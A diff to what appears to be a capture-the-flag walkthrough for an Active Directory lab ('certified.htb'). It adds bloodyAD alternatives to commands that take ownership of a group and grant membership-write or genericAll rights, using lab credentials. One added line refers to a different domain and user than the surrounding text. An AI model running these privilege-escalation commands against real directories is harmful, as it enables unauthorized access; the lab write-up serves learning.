@@ -12,7 +12,7 @@ First we add `judith.mader` as owner to Management group.
 ```bash
 owneredit.py -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
 
-# With password
+# With BloodyAD
 bloodyAD -u judith.mader -p judith09 -d certified.htb --host 10.129.68.162 set owner MANAGEMENT judith.mader
 
 # With Kerberos (no NTLM)
@@ -26,6 +26,9 @@ Since we now own the group, we can now give the user permission to add members v
 {% code overflow="wrap" %}
 ```bash
 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
+
+## With BloodyAD
+bloodyAD -u 'C.LEE' -p 'Password@123' -d 'motorhub.local' --host 192.168.178.74 add genericAll 'IT SUPPORT LEVEL 3' 'C.LEE' 
 ```
 {% endcode %}
 
